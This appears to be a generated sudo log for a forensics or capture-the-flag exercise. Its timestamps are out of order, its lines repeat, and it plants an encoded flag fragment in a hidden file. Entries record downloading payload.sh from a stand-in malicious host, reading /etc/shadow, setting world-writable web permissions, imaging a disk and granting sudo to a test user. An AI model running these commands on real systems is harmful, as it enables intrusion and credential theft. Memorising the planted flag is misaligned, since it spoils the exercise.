Mar 07 06:10:36 server sudo: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Mar 07 06:26:35 server sudo: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/chown root:root /etc/shadow
Mar 07 06:32:45 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/bin/echo 'NjU3ODcwNTg3YjYyMzM3Mzc0NWY3NjMzNzI3MzMxNmY2ZTVmMzA2NjVm' > /var/.hidden_file1
Mar 07 06:31:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/systemctl restart ssh
Mar 07 06:33:48 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar 07 06:22:24 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/systemctl restart ssh
Mar 07 06:19:48 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/chown root:root /etc/shadow
Mar 07 06:49:34 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
Mar 07 06:38:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Mar 07 06:25:38 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
Mar 07 06:16:57 server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
Mar 07 06:55:51 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
Mar 07 06:23:21 server sudo: root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/chmod 777 /var/www/html
Mar 07 06:15:13 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
Mar 07 06:50:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt update
Mar 07 06:58:55 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
Mar 07 06:16:28 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
Mar 07 06:31:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
Mar 07 06:14:24 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
Mar 07 06:22:24 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
Mar 07 06:49:22 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/useradd testuser
Mar 07 06:39:46 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
Mar 07 06:10:28 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
Mar 07 06:53:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
Mar 07 06:37:23 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar 07 06:34:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
Mar 07 06:11:42 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Mar 07 06:14:17 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
Mar 07 06:41:56 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
Mar 07 06:50:24 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
Mar 07 06:53:45 server sudo: service : TTY=pts/5 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
Mar 07 06:21:35 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
Mar 07 06:45:26 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/chown root:root /etc/shadow
Mar 07 06:31:32 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart ssh
Mar 07 06:16:47 server sudo: john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar 07 06:38:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Mar 07 06:25:38 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
Mar 07 06:16:57 server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
Mar 07 06:55:51 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
Mar 07 06:23:21 server sudo: root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/chmod 777 /var/www/html
Mar 07 06:15:13 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
Mar 07 06:50:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt update
Mar 07 06:58:55 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
Mar 07 06:16:28 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
Mar 07 06:31:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
Mar 07 06:14:24 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
Mar 07 06:22:24 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
Mar 07 06:49:22 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/useradd testuser
Mar 07 06:39:46 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
Mar 07 06:10:28 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
Mar 07 06:53:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
Mar 07 06:37:23 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar 07 06:34:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
Mar 07 06:38:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Mar 07 06:25:38 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
Mar 07 06:16:57 server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
Mar 07 06:55:51 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
Mar 07 06:23:21 server sudo: root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/chmod 777 /var/www/html
Mar 07 06:15:13 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
Mar 07 06:50:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt update
Mar 07 06:58:55 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
Mar 07 06:16:28 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
Mar 07 06:31:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
Mar 07 06:14:24 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
Mar 07 06:22:24 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
Mar 07 06:49:22 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/useradd testuser
Mar 07 06:39:46 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
Mar 07 06:10:28 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
Mar 07 06:53:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
Mar 07 06:37:23 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar 07 06:34:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
